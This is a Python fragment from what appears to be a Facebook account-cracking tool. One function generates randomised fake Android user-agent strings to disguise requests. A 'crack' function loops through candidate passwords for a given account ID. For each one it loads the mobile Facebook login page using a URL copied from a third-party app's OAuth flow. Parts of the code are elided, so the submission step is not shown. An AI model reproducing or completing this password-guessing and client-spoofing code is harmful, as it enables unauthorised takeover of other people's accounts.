...
def uaAsepitgans():
        rr = random.randint
        uagg = f"Mozilla/5.0 (Linux; Android {str(rr(3,9))}.{str(rr(0,1))}.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(28300,82900))}.{str(rr(75,150))} Mobile Safari/537.36"
        huag =f"Mozilla/5.0 (Linux; Android {str(rr(3,12))}; ABR-LX9; HMSCore {str(rr(6,10))}.{str(rr(9,25))}.{str(rr(6,10))}.{str(rr(310,1850))}; GMSCore 214816055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(28300,82900))}.{str(rr(75,150))} HuaweiBrowser/{str(rr(11,99))}.0.0.{str(rr(310,1850))} Mobile Safari/537.36"
        return random.choice([uagg,huag])
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=163543514909045&kid_directed_site=0&app_id=163543514909045&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D163543514909045%26cbt%3D1676260837091%26e2e%3D%257B%2522init%2522%253A1676260837091%257D%26ies%3D1%26sdk%3Dandroid-13.2.0%26sso%3Dchrome_custom_tab%26nonce%3D6da27ec0-3abf-49ad-b6d1-add141700008%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e10d1acd-c992-4f1c-bd5f-01c5b0d5fef9%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522oe6kfemuitff77kldlh%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.lemon.lvoverseas%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3Dk3fMzRncQPakTJZdgXbXmtwt81fGR8QgK7t6JSW7O9o%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De10d1acd-c992-4f1c-bd5f-01c5b0d5fef9%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.lemon.lvoverseas%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e10d1acd-c992-4f1c-bd5f-01c5b0d5fef9%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522oe6kfemuitff77kldlh%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
